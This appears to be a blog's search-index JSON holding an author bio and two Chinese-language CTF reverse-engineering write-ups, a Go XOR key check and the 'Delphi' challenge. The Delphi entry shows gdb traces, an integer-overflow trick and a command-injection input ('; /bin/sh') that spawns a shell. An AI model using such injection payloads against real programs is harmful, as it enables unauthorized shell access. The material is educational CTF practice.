{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to frozenkp's Blog Enjoy all informations here. If you like this blog, just give me a star. OwO Contact Me Feel free to contact me for any questions. Facebook Twitter","title":"HOME"},{"location":"#welcome-to-frozenkps-blog","text":"Enjoy all informations here. If you like this blog, just give me a star. OwO","title":"Welcome to frozenkp's Blog"},{"location":"#contact-me","text":"Feel free to contact me for any questions. Facebook Twitter","title":"Contact Me"},{"location":"about/","text":"Whoami Yi-Hsien Chen Currently a Ph.D student in National Taiwan University. Awards Year Rank Contest 2018 Finalist DEFCON CTF 2018 Final 2019 2 nd DEFCON CTF 2019 Final Presentations Conference Subject HITB CyberWeek 2020 Leverage macOS into battlefield: Construct macOS Cyber Range for Red / Blue Team Codeblue 2021 Engagement with Ransomware - Decrypting and Vaccinating HITCON 2021 No Time To Die - Ransomware Will Return HITCON 2022 Malware Behavior Analysis Acceleration based on Graph Neural Networks AVTOKYO 2022 Software Development In Another World - The Malware Industry SECCON 2022 Next Generation Sandbox with A Little Help From Machine Learning Publications Conference Year Subject The 2018 IEEE Conference on Dependable and Secure Computing 2018 Design and Implement of a Binary Fuzzer based on Libfuzzer ASIA CCS '20: Proceedings of the 15 th ACM Asia Conference on Computer and Communications 2020 POSTER: Construct macOS Cyber Range for Red/Blue Teams IEEE Transactions on Information Forensics and Security 2023 Guided Malware Sample Analysis based on Graph Neural Networks","title":"About"},{"location":"about/#whoami","text":"Yi-Hsien Chen Currently a Ph.D student in National Taiwan University.","title":"Whoami"},{"location":"about/#awards","text":"Year Rank Contest 2018 Finalist DEFCON CTF 2018 Final 2019 2 nd DEFCON CTF 2019 Final","title":"Awards"},{"location":"about/#presentations","text":"Conference Subject HITB CyberWeek 2020 Leverage macOS into battlefield: Construct macOS Cyber Range for Red / Blue Team Codeblue 2021 Engagement with Ransomware - Decrypting and Vaccinating HITCON 2021 No Time To Die - Ransomware Will Return HITCON 2022 Malware Behavior Analysis Acceleration based on Graph Neural Networks AVTOKYO 2022 Software Development In Another World - The Malware Industry SECCON 2022 Next Generation Sandbox with A Little Help From Machine Learning","title":"Presentations"},{"location":"about/#publications","text":"Conference Year Subject The 2018 IEEE Conference on Dependable and Secure Computing 2018 Design and Implement of a Binary Fuzzer based on Libfuzzer ASIA CCS '20: Proceedings of the 15 th ACM Asia Conference on Computer and Communications 2020 POSTER: Construct macOS Cyber Range for Red/Blue Teams IEEE Transactions on Information Forensics and Security 2023 Guided Malware Sample Analysis based on Graph Neural Networks","title":"Publications"},{"location":"Writeups/2014/NoConName_qual/inBINcible/","text":"inBINcible Challenge Link: Nope Category: reverse Writeup: inBINcible Get the key. The flag is: \u201cNcN_\u201d + sha1sum(key) inbincible \u89c0\u5bdf \u9019\u652f\u7a0b\u5f0f\u57f7\u884c\u5f8c\u76f4\u63a5\u8f38\u51fa Nope! \uff0c\u6c92\u6709\u4efb\u4f55\u8f38\u5165 % ./inbincible Nope! \u8d77\u624b\u5f0f \u9019\u500b\u57f7\u884c\u6a94\u662f 32 \u4f4d\u5143\u7684\uff0c\u4e14\u662f static link % file inbincible inbincible: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped \u767c\u73fe main.main \u61c9\u8a72\u662f go \u7684\u57f7\u884c\u6a94 % objdump -M intel -d inbincible inbincible\uff1a \u6a94\u6848\u683c\u5f0f elf32-i386 Disassembly of section .text: 08048c00 <main.main>: 8048c00: 65 8b 0d 00 00 00 00 mov ecx,DWORD PTR gs:0x0 8048c07: 8b 89 f8 ff ff ff mov ecx,DWORD PTR [ecx-0x8] 8048c0d: 8d 44 24 c0 lea eax,[esp-0x40] 8048c11: 3b 01 cmp eax,DWORD PTR [ecx] 8048c13: 77 0b ja 8048c20 <main.main+0x20> 8048c15: 31 ff xor edi,edi 8048c17: 31 c0 xor eax,eax ... go \u8d77\u624b\u5f0f \u7e3d\u5171\u6709\u5169\u500b\u51fd\u5f0f\u5728 main package \u4e2d % go tool objdump inbincible | grep 'TEXT main\\.' TEXT main.main(SB) /home/n/ctf/ncn_quals_2014/rev400/main.go TEXT main.func.001(SB) /home/n/ctf/ncn_quals_2014/rev400/main.go TEXT main.init(SB) /home/n/ctf/ncn_quals_2014/rev400/main.go \u5206\u6790 main \u904e\u7a0b\u4e2d\u767c\u73fe\u6709\u53d6\u51fa os.Args \uff0c\u53ef\u80fd\u662f\u85c9\u7531\u53c3\u6578\u8f38\u5165 0x8048ef1 <main.main+753>: cmp DWORD PTR ds:0x814e17c,0x1 0x8048ef8 <main.main+760>: jbe 0x804937d <main.main+1917> => 0x8048efe <main.main+766>: mov ebx,DWORD PTR ds:0x814e178 0x8048f04 <main.main+772>: add ebx,0x8 0x8048f07 <main.main+775>: mov esi,DWORD PTR [ebx+0x4] gdb-peda$ x/10gx 0x814e178 0x814e178 <os.Args>: 0x0000000218300000 0x0000000000000002 0x814e188 <persistent>: 0xf7fc91a400000000 0x00000000f7ff9000 0x814e198 <reflect.dummy>: 0x0000000000000000 0x0000000000000000 0x814e1a8 <sync.allPools>: 0x000000000814e03c 0x0000000000000000 0x814e1b8 <syscall.envs>: 0x0000004e1830e000 0x000000000000004e \u63a5\u8457\u6bd4\u8f03 esi \u548c ebp \uff0c\u6b64\u6642\u7684 ebp \u662f\u56fa\u5b9a\u7684 0x10 \uff0c\u800c esi \u662f\u53c3\u6578\u7684\u9577\u5ea6 \u731c\u6e2c\u53c3\u6578\u9577\u5ea6\u61c9\u8a72\u8981\u662f 0x10 0x8048f07 <main.main+775>: mov esi,DWORD PTR [ebx+0x4] 0x8048f0a <main.main+778>: mov ebx,DWORD PTR [esp+0x6c] 0x8048f0e <main.main+782>: mov ebp,DWORD PTR [ebx+0x4] => 0x8048f11 <main.main+785>: cmp esi,ebp 0x8048f13 <main.main+787>: je 0x8049048 <main.main+1096> 0x8048f19 <main.main+793>: xor ecx,ecx 0x8048f1b <main.main+795>: mov ebp,DWORD PTR [esp+0x88] \u5206\u6790 func.001 \u5728\u4e2d\u9593\u767c\u73fe reverse \u984c\u5e38\u898b\u7684 xor \uff0c\u76ee\u6a19\u662f ecx \u53ca ebp \u6b64\u6642\u7684 ecx \u662f 0x12 \uff0c ebp \u5247\u662f\u53c3\u6578\u7684\u7b2c\u4e00\u500b\u5b57 x47 ( 'G' ) 0x8049456 <main.func+150>: xor ecx,ebp \u63a5\u8457\u6bd4\u8f03\u4e86 cl \u53ca al \u6b64\u6642\u7684 cl \u662f xor \u7684\u7d50\u679c\uff0c al \u662f\u524d\u9762\u53d6\u51fa\u7684\u503c 0x804946a <main.func+170>: cmp cl,al \u5982\u679c\u5169\u8005\u4e00\u6a23\u7684\u8a71\uff0c\u6703\u900f\u904e go channel \u9001\u51fa 0x1 \u7d66 main \u731c\u6e2c\u53ef\u80fd\u662f\u53ea\u8981 16 \u500b\u5b57\u7d93\u904e xor \u4ee5\u5f8c\u90fd\u4e00\u6a23\u5c31\u53ef\u4ee5\u901a\u904e\u4e86 \u89e3\u6cd5 \u56e0\u70ba xor \u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u4e00\u6a23\u7684 key \u4f86\u627e\u5230\u539f\u59cb\u5b57\u4e32\uff0c\u6240\u4ee5\u53ea\u8981\u53d6\u51fa xor key \u4ee5\u53ca\u6700\u5f8c\u7684\u7b54\u6848\u5c31\u53ef\u4ee5\u4e86 xor key \u5be6\u969b\u67e5\u770b\u8a72\u4f4d\u7f6e\u5f8c\u767c\u73fe key \u53ea\u6709 5 bytes \uff0c\u7d93\u904e\u6e2c\u8a66\u5f8c\u767c\u73fe\u9019 5 bytes \u6703\u4e00\u76f4\u5faa\u74b0 \u4e5f\u5c31\u662f 0x12, 0x45, 0x33, 0x87, 0x65, 0x12, 0x45, 0x33, 0x87, 0x65, 0x12, 0x45, 0x33, 0x87, 0x65, 0x12 gdb-peda$ x/2gx 0x18300024-0x8 0x1830001c: 0x4533876500000000 0x0000000000000012 ans gdb-peda$ x/2gx 0x18300040 0x18300040: 0x0306330bb6447555 0x3344b247716002e9 xor \u5c07\u5169\u500b\u5b57\u4e32\u7d93\u904e xor \u4ee5\u5f8c\u5c31\u53ef\u4ee5\u5f97\u5230\u539f\u5b57\u4e32 G0w1n!C0ngr4t5!!","title":"inBINcible"},{"location":"Writeups/2014/NoConName_qual/inBINcible/#inbincible","text":"Challenge Link: Nope Category: reverse Writeup: inBINcible Get the key. The flag is: \u201cNcN_\u201d + sha1sum(key) inbincible","title":"inBINcible"},{"location":"Writeups/2014/NoConName_qual/inBINcible/#_1","text":"\u9019\u652f\u7a0b\u5f0f\u57f7\u884c\u5f8c\u76f4\u63a5\u8f38\u51fa Nope! \uff0c\u6c92\u6709\u4efb\u4f55\u8f38\u5165 % ./inbincible Nope!","title":"\u89c0\u5bdf"},{"location":"Writeups/2014/NoConName_qual/inBINcible/#_2","text":"\u9019\u500b\u57f7\u884c\u6a94\u662f 32 \u4f4d\u5143\u7684\uff0c\u4e14\u662f static link % file inbincible inbincible: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped \u767c\u73fe main.main \u61c9\u8a72\u662f go \u7684\u57f7\u884c\u6a94 % objdump -M intel -d inbincible inbincible\uff1a \u6a94\u6848\u683c\u5f0f elf32-i386 Disassembly of section .text: 08048c00 <main.main>: 8048c00: 65 8b 0d 00 00 00 00 mov ecx,DWORD PTR gs:0x0 8048c07: 8b 89 f8 ff ff ff mov ecx,DWORD PTR [ecx-0x8] 8048c0d: 8d 44 24 c0 lea eax,[esp-0x40] 8048c11: 3b 01 cmp eax,DWORD PTR [ecx] 8048c13: 77 0b ja 8048c20 <main.main+0x20> 8048c15: 31 ff xor edi,edi 8048c17: 31 c0 xor eax,eax ...","title":"\u8d77\u624b\u5f0f"},{"location":"Writeups/2014/NoConName_qual/inBINcible/#go","text":"\u7e3d\u5171\u6709\u5169\u500b\u51fd\u5f0f\u5728 main package \u4e2d % go tool objdump inbincible | grep 'TEXT main\\.' TEXT main.main(SB) /home/n/ctf/ncn_quals_2014/rev400/main.go TEXT main.func.001(SB) /home/n/ctf/ncn_quals_2014/rev400/main.go TEXT main.init(SB) /home/n/ctf/ncn_quals_2014/rev400/main.go","title":"go \u8d77\u624b\u5f0f"},{"location":"Writeups/2014/NoConName_qual/inBINcible/#main","text":"\u904e\u7a0b\u4e2d\u767c\u73fe\u6709\u53d6\u51fa os.Args \uff0c\u53ef\u80fd\u662f\u85c9\u7531\u53c3\u6578\u8f38\u5165 0x8048ef1 <main.main+753>: cmp DWORD PTR ds:0x814e17c,0x1 0x8048ef8 <main.main+760>: jbe 0x804937d <main.main+1917> => 0x8048efe <main.main+766>: mov ebx,DWORD PTR ds:0x814e178 0x8048f04 <main.main+772>: add ebx,0x8 0x8048f07 <main.main+775>: mov esi,DWORD PTR [ebx+0x4] gdb-peda$ x/10gx 0x814e178 0x814e178 <os.Args>: 0x0000000218300000 0x0000000000000002 0x814e188 <persistent>: 0xf7fc91a400000000 0x00000000f7ff9000 0x814e198 <reflect.dummy>: 0x0000000000000000 0x0000000000000000 0x814e1a8 <sync.allPools>: 0x000000000814e03c 0x0000000000000000 0x814e1b8 <syscall.envs>: 0x0000004e1830e000 0x000000000000004e \u63a5\u8457\u6bd4\u8f03 esi \u548c ebp \uff0c\u6b64\u6642\u7684 ebp \u662f\u56fa\u5b9a\u7684 0x10 \uff0c\u800c esi \u662f\u53c3\u6578\u7684\u9577\u5ea6 \u731c\u6e2c\u53c3\u6578\u9577\u5ea6\u61c9\u8a72\u8981\u662f 0x10 0x8048f07 <main.main+775>: mov esi,DWORD PTR [ebx+0x4] 0x8048f0a <main.main+778>: mov ebx,DWORD PTR [esp+0x6c] 0x8048f0e <main.main+782>: mov ebp,DWORD PTR [ebx+0x4] => 0x8048f11 <main.main+785>: cmp esi,ebp 0x8048f13 <main.main+787>: je 0x8049048 <main.main+1096> 0x8048f19 <main.main+793>: xor ecx,ecx 0x8048f1b <main.main+795>: mov ebp,DWORD PTR [esp+0x88]","title":"\u5206\u6790 main"},{"location":"Writeups/2014/NoConName_qual/inBINcible/#func001","text":"\u5728\u4e2d\u9593\u767c\u73fe reverse \u984c\u5e38\u898b\u7684 xor \uff0c\u76ee\u6a19\u662f ecx \u53ca ebp \u6b64\u6642\u7684 ecx \u662f 0x12 \uff0c ebp \u5247\u662f\u53c3\u6578\u7684\u7b2c\u4e00\u500b\u5b57 x47 ( 'G' ) 0x8049456 <main.func+150>: xor ecx,ebp \u63a5\u8457\u6bd4\u8f03\u4e86 cl \u53ca al \u6b64\u6642\u7684 cl \u662f xor \u7684\u7d50\u679c\uff0c al \u662f\u524d\u9762\u53d6\u51fa\u7684\u503c 0x804946a <main.func+170>: cmp cl,al \u5982\u679c\u5169\u8005\u4e00\u6a23\u7684\u8a71\uff0c\u6703\u900f\u904e go channel \u9001\u51fa 0x1 \u7d66 main \u731c\u6e2c\u53ef\u80fd\u662f\u53ea\u8981 16 \u500b\u5b57\u7d93\u904e xor \u4ee5\u5f8c\u90fd\u4e00\u6a23\u5c31\u53ef\u4ee5\u901a\u904e\u4e86","title":"\u5206\u6790 func.001"},{"location":"Writeups/2014/NoConName_qual/inBINcible/#_3","text":"\u56e0\u70ba xor \u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u4e00\u6a23\u7684 key \u4f86\u627e\u5230\u539f\u59cb\u5b57\u4e32\uff0c\u6240\u4ee5\u53ea\u8981\u53d6\u51fa xor key \u4ee5\u53ca\u6700\u5f8c\u7684\u7b54\u6848\u5c31\u53ef\u4ee5\u4e86","title":"\u89e3\u6cd5"},{"location":"Writeups/2014/NoConName_qual/inBINcible/#xor-key","text":"\u5be6\u969b\u67e5\u770b\u8a72\u4f4d\u7f6e\u5f8c\u767c\u73fe key \u53ea\u6709 5 bytes \uff0c\u7d93\u904e\u6e2c\u8a66\u5f8c\u767c\u73fe\u9019 5 bytes \u6703\u4e00\u76f4\u5faa\u74b0 \u4e5f\u5c31\u662f 0x12, 0x45, 0x33, 0x87, 0x65, 0x12, 0x45, 0x33, 0x87, 0x65, 0x12, 0x45, 0x33, 0x87, 0x65, 0x12 gdb-peda$ x/2gx 0x18300024-0x8 0x1830001c: 0x4533876500000000 0x0000000000000012","title":"xor key"},{"location":"Writeups/2014/NoConName_qual/inBINcible/#ans","text":"gdb-peda$ x/2gx 0x18300040 0x18300040: 0x0306330bb6447555 0x3344b247716002e9","title":"ans"},{"location":"Writeups/2014/NoConName_qual/inBINcible/#xor","text":"\u5c07\u5169\u500b\u5b57\u4e32\u7d93\u904e xor \u4ee5\u5f8c\u5c31\u53ef\u4ee5\u5f97\u5230\u539f\u5b57\u4e32 G0w1n!C0ngr4t5!!","title":"xor"},{"location":"Writeups/2015/B-Sides_Vancouver/Delphi/","text":"Delphi Challenge link: Nope Category: reverse Writeup: Delphi delphi libtwenty.so Observation \u56e0\u70ba\u6709\u984d\u5916\u7d66\u7684 Library \uff0c\u6240\u4ee5\u8981\u57f7\u884c(\u5206\u6790)\u7684\u6642\u5019\u8981\u642d\u914d LD_LIBRARY_PATH=. \u5c07\u7576\u524d\u8cc7\u6599\u593e\u6307\u5b9a\u7d66 Library \u8def\u5f91 $ LD_LIBRARY_PATH = . ./delphi Welcome! Are you ready to play 20 questions? No? Perfect! I 'm thinking of something big, metal, and orange. Go! > test Who' s that? > deadbeef Who ' s that? > file $ file ./delphi ./delphi: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 70886b932f383987896e371d422ab8a4089bd148, not stripped go binary Objdump \u5f8c\u767c\u73fe main.main \uff0c\u662f go \u7684 binary \u6a94\uff0c\u5176\u4e2d\u5728 main package \u4e2d\u6709\u5169\u500b\u6bd4\u8f03\u7279\u5225\u7684 function main.doTheMagic main._Cfunc_check_answer (cgo \u7684 function) $ objdump -d delphi | grep '.*main.*>:' 0000000000400df0 <__libc_start_main@plt>: 0000000000401280 <main.main>: 0000000000401c30 <main.doTheMagic>: 0000000000401df0 <main.init>: 00000000004021c0 <main._Cfunc_CString>: 0000000000402230 <main._Cfunc_check_answer>: 0000000000402270 <main._Cfunc_free>: 0000000000411b20 <runtime.main>: 00000000004295b0 <main>: Solution Input \u4e00\u958b\u59cb\u5148\u627e\u770b\u770b\u8f38\u5165\u7684\u5730\u65b9 $ go tool objdump delphi | grep '.*main\\.go.*Scan' main.go:34 0x4016ee bd30b74f00 MOVL $bufio .ScanLines.f ( SB ) , BP main.go:35 0x401755 e816b80200 CALL bufio. ( *Scanner ) .Scan ( SB ) 0x401747 <main.main+1223>: mov QWORD PTR [ rsp+0x48 ] ,rax 0x40174c <main.main+1228>: mov rbx,QWORD PTR [ rsp+0x48 ] 0x401751 <main.main+1233>: mov QWORD PTR [ rsp ] ,rbx = > 0x401755 <main.main+1237>: call 0x42cf70 <bufio. ( *Scanner ) .Scan> 0x40175a <main.main+1242>: movzx rbx,BYTE PTR [ rsp+0x8 ] 0x401760 <main.main+1248>: cmp bl,0x0 0x401763 <main.main+1251>: je 0x4018b1 <main.main+1585> 0x401769 <main.main+1257>: mov rdi,QWORD PTR [ rsp+0x48 ] Guessed arguments: arg [ 0 ] : 0xc208028130 --> 0x0 arg [ 1 ] : 0x7ffff7e20df0 --> 0xc208020000 --> 0x0 \u8f38\u5165 deadbeef \u5f8c\u7e7c\u7e8c\u89c0\u5bdf \u767c\u73fe\u5f8c\u9762\u51fa\u73fe\u4e00\u6bb5\u6709\u8da3\u7684\u6bd4\u8f03\uff0c\u6b64\u6642\u7684 rdx \u662f\u8f38\u5165\u7684\u9577\u5ea6\uff0c rax \u662f 'go' \u7684\u9577\u5ea6 \u7531\u5e95\u4e0b jl \u548c jb \u53ef\u77e5 \u8f38\u5165\u4e0d\u80fd\u5c0f\u65bc 2 RAX: 0x2 RBX: 0x4d7f60 --> 0x4d7f70 --> 0x6f67 ( 'go' ) RCX: 0x66656562 ( 'beef' ) RDX: 0x8 RSI: 0x4d7f70 --> 0x6f67 ( 'go' ) RDI: 0xc208000260 ( \"deadbeef\" ) RBP: 0x7ffff7fb3000 --> 0x781d28 ( 0x00007ffff7fb3000 ) RSP: 0x7ffff7e20dc0 --> 0xc208013000 ( \"deadbeef\\n\" ) [ -------------------------------------code------------------------------------- ] 0x401939 <main.main+1721>: mov rax,QWORD PTR [ rbx+0x8 ] 0x40193d <main.main+1725>: mov QWORD PTR [ rsp+0x90 ] ,rdx 0x401945 <main.main+1733>: mov QWORD PTR [ rsp+0xb0 ] ,rax = > 0x40194d <main.main+1741>: cmp rdx,rax 0x401950 <main.main+1744>: jl 0x401baa <main.main+2346> 0x401956 <main.main+1750>: cmp rdx,rax 0x401959 <main.main+1753>: jb 0x401bb2 <main.main+2354> 0x40195f <main.main+1759>: mov QWORD PTR [ rsp+0xb8 ] ,rdi \u518d\u5f80\u4e0b\u770b\uff0c\u51fa\u73fe\u4e86 runtime.eqstring \u6bd4\u8f03\u7684\u76ee\u6a19\u662f \u8f38\u5165 ( 'deadbeef' ) \u4ee5\u53ca 'go' \u7684\u524d\u5169\u500b byte (0x2) 0x401986 <main.main+1798>: mov QWORD PTR [ rsp+0x18 ] ,rax = > 0x40198b <main.main+1803>: call 0x425600 <runtime.eqstring> 0x401990 <main.main+1808>: movzx rbx,BYTE PTR [ rsp+0x20 ] [ ------------------------------------stack------------------------------------- ] 0000 | 0x7ffff7e20dc0 --> 0xc208000260 ( \"deadbeef\" ) 0008 | 0x7ffff7e20dc8 --> 0x2 0016 | 0x7ffff7e20dd0 --> 0x4d7f70 --> 0x6f67 ( 'go' ) 0024 | 0x7ffff7e20dd8 --> 0x2 \u5be6\u969b\u6e2c\u8a66\u4e00\u4e0b\uff0c\u679c\u7136\u8f38\u5165\u958b\u982d\u662f go \u7684\u8a71\u5c31\u6703\u51fa\u73fe\u4e0d\u4e00\u6a23\u7684\u7d50\u679c LD_LIBRARY_PATH = . ./delphi Welcome! Are you ready to play 20 questions? No? Perfect! I 'm thinking of something big, metal, and orange. Go! > goabcd Sneaky, sneaky. Go where? How fast? > go Sneaky, sneaky. Go where? How fast? > abcd Who' s that? > \u6bd4\u5c0d\u6b63\u78ba\u5f8c\u5c31\u6703\u9032\u5165 main.doTheMagic \u4e86 0x401a0d <main.main+1933>: mov QWORD PTR [ rsp+0x8 ] ,rax = > 0x401a12 <main.main+1938>: call 0x401c30 <main.doTheMagic> 0x401a17 <main.main+1943>: lea rbx,ds:0x4d4060 doTheMagic \u7e7c\u7e8c\u5f80\u4e0b\u770b\uff0c\u767c\u73fe strings.Split \uff0c\u4ee5\u7a7a\u683c( ' ' )\u4f5c\u70ba\u5207\u5272\u9ede \u7e7c\u7e8c\u57f7\u884c\u5f8c\u5c31\u7d50\u675f\u4e86 0x401c77 <main.doTheMagic+71>: mov rdi,rbp 0x401c7a <main.doTheMagic+74>: movs QWORD PTR es: [ rdi ] ,QWORD PTR ds: [ rsi ] 0x401c7c <main.doTheMagic+76>: movs QWORD PTR es: [ rdi ] ,QWORD PTR ds: [ rsi ] = > 0x401c7e <main.doTheMagic+78>: call 0x44a480 <strings.Split> 0x401c83 <main.doTheMagic+83>: mov rdx,QWORD PTR [ rsp+0x20 ] 0x401c88 <main.doTheMagic+88>: mov rax,QWORD PTR [ rsp+0x28 ] 0x401c8d <main.doTheMagic+93>: mov rcx,QWORD PTR [ rsp+0x30 ] 0x401c92 <main.doTheMagic+98>: mov QWORD PTR [ rsp+0x68 ] ,rdx Guessed arguments: arg [ 0 ] : 0x7ffff7e20d40 --> 0x8 arg [ 1 ] : 0x4d37d0 --> 0x20 ( ' ' ) \u53e6\u5916\u5728\u5f8c\u9762\u53ef\u4ee5\u627e\u5230 main._Cfunc_check_answer 401dbf: e8 6c 04 00 00 callq 402230 <main._Cfunc_check_answer> \u6211\u731c\u53ef\u80fd\u8f38\u5165\u8981\u7528\u7a7a\u683c\u5206\u6210\u597d\u5e7e\u6bb5\uff0c\u56e0\u6b64\u6211\u5728 main._Cfunc_check_answer \u8a2d\u65b7\u9ede\uff0c\u4e26\u586b\u5165\u4e0d\u540c\u6578\u76ee\u7684\u8f38\u5165\u6e2c\u8a66\uff0c\u6700\u5f8c\u767c\u73fe\u9700\u8981\u8f38\u5165\u5171\u4e09\u6bb5\u5c31\u6703\u7d93\u904e\u65b7\u9ede\uff0c\u8f38\u5165\u683c\u5f0f\u5982\u4e0b go <something> <something> check_answer \u5f80\u4e0b\u770b\u767c\u73fe\u4ed6\u5229\u7528 cgocall \u547c\u53eb\u4e86 0x400f80 = > 0x402249 <main._Cfunc_check_answer+25>: mov eax,0x400f80 0x40224e <main._Cfunc_check_answer+30>: mov QWORD PTR [ rsp ] ,rax 0x402252 <main._Cfunc_check_answer+34>: lea rax, [ rsp+0x18 ] 0x402257 <main._Cfunc_check_answer+39>: mov QWORD PTR [ rsp+0x8 ] ,rax 0x40225c <main._Cfunc_check_answer+44>: call 0x404da0 <runtime.cgocall> gdb-peda$ x/5gi 0x400f80 0x400f80 <_cgo_de3376964270_Cfunc_check_answer>: mov rsi,QWORD PTR [ rdi+0x8 ] 0x400f84 <_cgo_de3376964270_Cfunc_check_answer+4>: mov edi,DWORD PTR [ rdi ] 0x400f86 <_cgo_de3376964270_Cfunc_check_answer+6>: jmp 0x400de0 <check_answer@plt> 0x400f8b: nop DWORD PTR [ rax+rax*1+0x0 ] 0x400f90 <_cgo_de3376964270_Cfunc_free>: mov rdi,QWORD PTR [ rdi ] \u8981\u8ffd\u9032\u53bb\u7684\u8a71\uff0c\u5efa\u8b70\u662f\u5728 0x400f80 \u8a2d\u65b7\u9ede\uff0c\u63a5\u8457 continue \u904e\u53bb\uff0c\u907f\u514d\u4e2d\u9014\u6c92\u8ddf\u5230 \u6700\u5f8c\u6703\u56de\u5230 check_answer = > 0x7ffff7bd5758 <check_answer>: push rbp 0x7ffff7bd5759 <check_answer+1>: mov rbp,rsp 0x7ffff7bd575c <check_answer+4>: sub rsp,0xa0 0x7ffff7bd5763 <check_answer+11>: mov DWORD PTR [ rbp-0x94 ] ,edi 0x7ffff7bd5769 <check_answer+17>: mov QWORD PTR [ rbp-0xa0 ] ,rsi \u5f80\u4e0b\u8ffd\u6703\u51fa\u73fe\u4e00\u500b\u6709\u8da3\u7684\u6771\u897f \u6b64\u6642\u7684 eax \u662f\u6700\u5f8c\u4e00\u6bb5\u8f38\u5165\u7684\u503c\uff0c\u56e0\u70ba\u6211\u8f38\u5165\u7684\u662f go abc def \uff0c\u6240\u4ee5\u9019\u908a\u7684 eax \u56e0\u7232\u8f49\u4e0d\u51fa\u4f86\u6240\u4ee5\u8b8a\u6210 0 add \u5f8c\u8b8a\u6210 42\uff0c\u7531\u6b64\u53ef\u77e5 [rbp-0x2] \u539f\u59cb\u503c\u61c9\u8a72\u662f 42 0x7ffff7bd5789 <check_answer+49>: mov eax,DWORD PTR [ rbp-0x94 ] = > 0x7ffff7bd578f <check_answer+55>: add WORD PTR [ rbp-0x2 ] ,ax 0x7ffff7bd5793 <check_answer+59>: movzx eax,WORD PTR [ rbp-0x2 ] 0x7ffff7bd5797 <check_answer+63>: cmp eax,0x4 0x7ffff7bd579a <check_answer+66>: ja 0x7ffff7bd57ed <check_answer+149> \u5982\u679c\u6bd4\u8f03\u7b26\u5408\u5f8c\u8df3\u904e\u53bb\uff0c\u6703\u51fa\u73fe strcat \u4ee5\u53ca system \u5728 stack \u4e2d\u53ef\u4ee5\u770b\u5230 \u2019echo' \u4ee5\u53ca\u7b2c\u4e8c\u6bb5\u8f38\u5165 'abc' \uff0c\u770b\u4f86\u662f\u5408\u6210 'echo abc' \u4ee5\u5f8c\u5229\u7528 system \u57f7\u884c = > 0x7ffff7bd57d7 <check_answer+127>: call 0x7ffff7bd5650 <strcat@plt> 0x7ffff7bd57dc <check_answer+132>: lea rax, [ rbp-0x90 ] 0x7ffff7bd57e3 <check_answer+139>: mov rdi,rax 0x7ffff7bd57e6 <check_answer+142>: call 0x7ffff7bd5630 <system@plt> [ ------------------------------------stack------------------------------------- ] 0000 | 0x7fffffffe4f0 --> 0x788170 --> 0x636261 ( 'abc' ) 0008 | 0x7fffffffe4f8 --> 0x0 0016 | 0x7fffffffe500 --> 0x206f686365 ( 'echo ' ) \u7d9c\u5408\u4e0a\u8ff0\uff0c\u6211\u5011\u61c9\u8a72\u8981\u4f7f 42 + {number} >= 4 \u9019\u88e1\u6709\u500b\u6709\u8da3\u7684\u5730\u65b9\uff0c\u4ed6\u5728\u53d6\u503c\u7684\u6642\u5019\u662f\u4f7f\u7528 WORD (2 bytes) \u4f86\u53d6\uff0c\u7576\u9019\u88e1\u7684\u503c\u8d85\u904e WORD \u4e0a\u9650\u6642\u5c31\u6703\u6b78\u96f6\uff0c\u6211\u5011\u53ef\u4ee5\u5229\u7528\u9019\u500b\u9ede\u4f86\u9054\u6210\u4e0a\u8ff0\u7684\u689d\u4ef6 number = 2^16 - 42 + eax command injection \u524d\u9762\u6709\u770b\u5230\u7d44\u5408\u7684 'echo abc' \uff0c\u6b64\u6642\u53ef\u4ee5\u5229\u7528 ; \u4f86\u9032\u884c command injection \u4f86\u62ff\u5230 shell $ LD_LIBRARY_PATH = . ./delphi Welcome! Are you ready to play 20 questions? No? Perfect! I ' m thinking of something big, metal, and orange. Go! > go abc ; /bin/sh 65498 # 2^16 - 42 + 4 (eax = 4) abc $ ls delphi libtwenty.so peda-session-delphi.txt $","title":"Delphi"},{"location":"Writeups/2015/B-Sides_Vancouver/Delphi/#delphi","text":"Challenge link: Nope Category: reverse Writeup: Delphi delphi libtwenty.so","title":"Delphi"},{"location":"Writeups/2015/B-Sides_Vancouver/Delphi/#observation","text":"\u56e0\u70ba\u6709\u984d\u5916\u7d66\u7684 Library \uff0c\u6240\u4ee5\u8981\u57f7\u884c(\u5206\u6790)\u7684\u6642\u5019\u8981\u642d\u914d LD_LIBRARY_PATH=. \u5c07\u7576\u524d\u8cc7\u6599\u593e\u6307\u5b9a\u7d66 Library \u8def\u5f91 $ LD_LIBRARY_PATH = . ./delphi Welcome! Are you ready to play 20 questions? No? Perfect! I 'm thinking of something big, metal, and orange. Go! > test Who' s that? > deadbeef Who ' s that? >","title":"Observation"},{"location":"Writeups/2015/B-Sides_Vancouver/Delphi/#file","text":"$ file ./delphi ./delphi: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 70886b932f383987896e371d422ab8a4089bd148, not stripped","title":"file"},{"location":"Writeups/2015/B-Sides_Vancouver/Delphi/#go-binary","text":"Objdump \u5f8c\u767c\u73fe main.main \uff0c\u662f go \u7684 binary \u6a94\uff0c\u5176\u4e2d\u5728 main package \u4e2d\u6709\u5169\u500b\u6bd4\u8f03\u7279\u5225\u7684 function main.doTheMagic main._Cfunc_check_answer (cgo \u7684 function) $ objdump -d delphi | grep '.*main.*>:' 0000000000400df0 <__libc_start_main@plt>: 0000000000401280 <main.main>: 0000000000401c30 <main.doTheMagic>: 0000000000401df0 <main.init>: 00000000004021c0 <main._Cfunc_CString>: 0000000000402230 <main._Cfunc_check_answer>: 0000000000402270 <main._Cfunc_free>: 0000000000411b20 <runtime.main>: 00000000004295b0 <main>:","title":"go binary"},{"location":"Writeups/2015/B-Sides_Vancouver/Delphi/#solution","text":"","title":"Solution"},{"location":"Writeups/2015/B-Sides_Vancouver/Delphi/#input","text":"\u4e00\u958b\u59cb\u5148\u627e\u770b\u770b\u8f38\u5165\u7684\u5730\u65b9 $ go tool objdump delphi 